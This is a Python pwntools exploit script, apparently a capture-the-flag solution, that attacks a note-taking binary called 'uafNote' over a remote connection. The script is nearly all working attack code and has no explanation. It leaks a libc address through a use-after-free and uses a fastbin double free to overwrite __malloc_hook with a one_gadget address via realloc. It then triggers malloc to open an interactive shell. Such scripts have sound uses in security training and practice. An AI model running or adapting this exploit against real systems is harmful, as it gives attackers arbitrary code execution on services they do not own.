from pwn import *
context.binary = ELF('./uafNote')
context.log_level = 'debug'
elf= context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0xdff')
	raw_input()

def menu(ch):
	p.sendlineafter('>>', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size', str(size))
	p.sendlineafter('content', content)

def show(idx):
	menu(3)
	p.sendlineafter('index', str(idx))

def free(idx):
	menu(2)
	p.sendlineafter('index', str(idx))

def exploit():
	#uaf
	#leak libc
	add(0x180, 'a')
	add(0x10, 'padding')
	free(0)
	show(0)
	main_arena = u64(p.recvuntil('\x7f')[1:].ljust(8, '\x00'))
	libc.address = main_arena - 0x3c3b78

	print "libc ==> ", hex(libc.address)
	
	realloc_hook = libc.symbols['__realloc_hook']
	malloc_hook = libc.symbols['__malloc_hook']
	realloc = libc.symbols['realloc']
	
	print "malloc_hook ==> ", hex(malloc_hook)
	print "realloc ==> ", hex(realloc)
	add(0x180, 'padding')

	#double chain
	add(0x68, 'a')
	add(0x68, 'b')
	add(0x68, 'padding')

	free(3)
	free(4)
	free(3)
	add(0x68, p64(malloc_hook - 0x23))
	add(0x68, 'b')
	add(0x68, 'c')

	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	add(0x68, '\x00'*0xb + p64(gadgets[1] + libc.address) + p64(realloc+13))
	#dbg()
	menu(1)
	p.sendlineafter('size', '128')
	p.interactive()
	p.close()


if __name__ == '__main__':
	p = remote('120.78.153.191', 22084)
	libc = ELF('./libc-2.23.so')
	elf= ELF('./uafNote')
	#p = elf.process(env={'LD_PRELOAD':'./libc-2.23.so'})
	exploit()